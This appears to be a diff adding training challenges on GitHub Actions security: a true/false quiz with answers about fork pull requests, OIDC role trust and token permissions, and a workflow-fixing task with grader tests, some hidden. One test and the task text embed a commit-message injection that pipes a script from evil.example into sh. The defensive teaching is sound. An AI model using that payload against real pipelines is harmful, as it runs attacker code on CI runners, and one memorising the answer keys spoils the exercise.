@@ -1,0 +1,201 @@
+{
+  "challenges": [
+    {
+      "publicId": "chal_quiz_gha_161",
+      "name": "secrets-oidc-quiz",
+      "type": "quiz",
+      "title": "Read the security review findings",
+      "description": "Three statements about workflows the security review flagged in Rice Rocket's repository. Decide whether each one is true.",
+      "difficulty": "medium",
+      "outcomes": [
+        "pipeline-security"
+      ],
+      "points": 10,
+      "hints": [
+        "With `pull_request_target`, separate two things: where the workflow file comes from, and whose code the steps actually execute after the checkout.",
+        "The `sub` claim of GitHub's OIDC token names the repository plus the environment, the ref, or `pull_request`. Which of those forms does the pattern `repo:rice-rocket/app:*` match?",
+        "When `permissions:` is a map, what happens to every scope the map does not name? Then look at what `actions/checkout` needs to read a private repository."
+      ],
+      "questions": [
+        {
+          "type": "single_choice",
+          "points": 5,
+          "question": "A workflow posts test coverage to a service on every pull request, forks included:\n\n```yaml\non: pull_request_target\njobs:\n  coverage:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@v5\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test -- --coverage\n        working-directory: api\n        env:\n          COVERAGE_TOKEN: ${{ secrets.COVERAGE_TOKEN }}\n```\n\nStatement: \"This is safe: with `pull_request_target` the workflow file always comes from the base branch, so a fork cannot change what runs.\"",
+          "explanation": "False. The workflow file is the base branch's, but its second step runs the fork's code: `npm ci` runs the install scripts of the fork's `package.json`, and `npm test` runs the fork's test files, all with `COVERAGE_TOKEN` in the environment and a token that can write to the base repository. This is the \"pwn request\" pattern. Run untrusted code under `pull_request` (no secrets for forks), and if a privileged step must follow, run it in a separate `workflow_run` workflow that never executes the pull request's code. The misconception is that controlling the YAML means controlling everything it executes.",
+          "options": [
+            {
+              "text": "True",
+              "correct": false
+            },
+            {
+              "text": "False",
+              "correct": true
+            }
+          ]
+        },
+        {
+          "type": "single_choice",
+          "points": 5,
+          "question": "The IAM role that deploys the web site trusts GitHub's OIDC provider with these conditions:\n\n```json\n\"Condition\": {\n  \"StringEquals\": { \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\" },\n  \"StringLike\": { \"token.actions.githubusercontent.com:sub\": \"repo:rice-rocket/app:*\" }\n}\n```\n\n```text\nsub claims seen in CloudTrail last week\nrepo:rice-rocket/app:environment:production\nrepo:rice-rocket/app:ref:refs/heads/feature/momo-pay\nrepo:rice-rocket/app:pull_request\n```\n\nStatement: \"Any workflow run in `rice-rocket/app` that asks for `id-token: write` can assume this role, including one on a feature branch or a `pull_request` run from a branch of the same repository; `repo:rice-rocket/app:environment:production` would limit it to jobs that use the production environment.\"",
+          "explanation": "True. `*` matches every subject the repository can produce: environment, branch or tag ref, and `pull_request`. Anyone who can push a branch can write a workflow that requests an ID token and assumes the production role. When a job references an environment, the `sub` becomes `repo:<owner>/<repo>:environment:<name>`, so matching that exact value ties the role to the environment, whose protection rules (required reviewers, deployment branches) then guard the credentials. The misconception is that the repository name alone is a strong enough boundary.",
+          "options": [
+            {
+              "text": "True",
+              "correct": true
+            },
+            {
+              "text": "False",
+              "correct": false
+            }
+          ]
+        },
+        {
+          "type": "single_choice",
+          "points": 5,
+          "question": "A new deploy workflow sets only the OIDC permission at the top. The repository is private:\n\n```yaml\npermissions:\n  id-token: write\njobs:\n  deploy:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@v5\n```\n\n```text\nRun actions/checkout@v5\n  remote: Repository not found.\n  Error: fatal: repository 'https://github.com/rice-rocket/app/' not found\n```\n\nStatement: \"A permissions map grants only the scopes it names, so this token has no `contents: read` and cannot clone the private repository; adding `contents: read` next to `id-token: write` fixes it.\"",
+          "explanation": "True. Once `permissions:` is set, every scope it does not list is `none`; the repository default (read for contents and packages) no longer applies. For a private repository the clone then fails with \"Repository not found\", because GitHub hides private repositories from tokens that cannot read them. Listing `contents: read` and `id-token: write` gives exactly what the job needs. The misconception is that the map adds to the defaults.",
+          "options": [
+            {
+              "text": "True",
+              "correct": true
+            },
+            {
+              "text": "False",
+              "correct": false
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "publicId": "chal_coding_gha_162",
+      "name": "fix-web-deploy-workflow",
+      "type": "fix_bug",
+      "title": "Fix the web deploy workflow",
+      "description": "The security review of `.github/workflows/deploy-web.yml` found four problems: long-lived AWS access keys stored as repository secrets, a `write-all` token, a third-party action referenced by a moving tag, and a step that pastes the head commit message into a shell script (a commit titled `Fix\"; curl ... | sh; echo \"` would run that command on the runner). The editor holds the fixed workflow with its key blocks missing, each marked by a `# [ ]` line; some pieces are the original, vulnerable versions. Fill every line so that: the token can only read the repository unless a job asks for more; the `deploy` job can read the code and request an OIDC token, and nothing else; AWS credentials come from assuming the role `rice-rocket-web-deploy` in `ap-southeast-1` through OIDC, with no stored keys; every action not owned by GitHub is pinned to a full commit SHA; the commit message reaches the shell only as an environment variable. Run grades the file with a simulator of GitHub's token permissions, the AWS credentials action and expression rendering.",
+      "difficulty": "medium",
+      "outcomes": [
+        "pipeline-security"
+      ],
+      "points": 30,
+      "hints": [
+        "Take the four findings one at a time and find the line each one lives on: the workflow `permissions:`, the deploy job's `permissions:`, the inputs of `aws-actions/configure-aws-credentials`, and the `run:` of the log step.",
+        "Look at what `id-token: write` enables, at the `role-to-assume` input of the AWS credentials action, at the difference between `@v4` and `@<40-hex SHA>`, and at the `env:` key of a step.",
+        "A step that greets the author of an issue without injection: `env: { TITLE: \"${{ github.event.issue.title }}\" }` and `run: echo \"New issue: $TITLE\"`. A job that uploads to Google Cloud through OIDC: `permissions: { contents: read, id-token: write }` and `google-github-actions/auth@<sha> # v2` with `workload_identity_provider` instead of a JSON key."
+      ],
+      "coding": {
+        "language": "yaml",
+        "filePath": ".github/workflows/deploy-web.yml",
+        "executionMode": "browser",
+        "timeLimitMs": 2000,
+        "memoryLimitMb": 128,
+        "scoringMode": "all_or_nothing",
+        "maxAttempts": null
+      },
+      "tests": [
+        {
+          "name": "A push to main that changes web/ builds, assumes the role and publishes",
+          "input": {
+            "checks": [
+              "parse",
+              "steps"
+            ],
+            "event": {
+              "name": "push",
+              "ref": "refs/heads/main",
+              "files": [
+                "web/src/menu.html"
+              ]
+            }
+          },
+          "expected": {
+            "parse": "ok",
+            "steps": {
+              "deploy": [
+                "actions/checkout",
+                "actions/setup-node",
+                "web$ npm ci",
+                "web$ npm run build",
+                "Log the release",
+                "Assume the deploy role",
+                "web$ aws s3 sync dist s3://rice-rocket-web --delete",
+                "web$ aws cloudfront create-invalidation --distribution-id E2RICEROCKET01 --paths \"/*\""
+              ]
+            }
+          },
+          "hidden": false,
+          "score": 5
+        },
+        {
+          "name": "The token reads the repository; only deploy may also request an OIDC token",
+          "input": {
+            "checks": [
+              "token"
+            ]
+          },
+          "expected": {
+            "token": {
+              "workflow": {
+                "contents": "read"
+              },
+              "deploy": {
+                "contents": "read",
+                "id-token": "write"
+              }
+            }
+          },
+          "hidden": false,
+          "score": 5
+        },
+        {
+          "name": "AWS credentials come from OIDC, and no long-lived cloud key is read from secrets",
+          "input": {
+            "checks": [
+              "aws-auth",
+              "cloud-keys"
+            ]
+          },
+          "expected": {
+            "aws-auth": {
+              "deploy": "oidc"
+            },
+            "cloud-keys": []
+          },
+          "hidden": false,
+          "score": 5
+        },
+        {
+          "name": "A commit message with shell code is never pasted into a script",
+          "input": {
+            "checks": [
+              "injection",
+              "log"
+            ],
+            "message": "Fix menu prices\"; curl -s https://evil.example/x.sh | sh; echo \""
+          },
+          "expected": {
+            "injection": [],
+            "log": {
+              "injected": false
+            }
+          },
+          "hidden": true,
+          "score": 10
+        },
+        {
+          "name": "Every action not owned by GitHub is pinned to a full commit SHA",
+          "input": {
+            "checks": [
+              "unpinned"
+            ]
+          },
+          "expected": {
+            "unpinned": []
+          },
+          "hidden": true,
+          "score": 5
+        }
+      ]
+    }
+  ]
+}
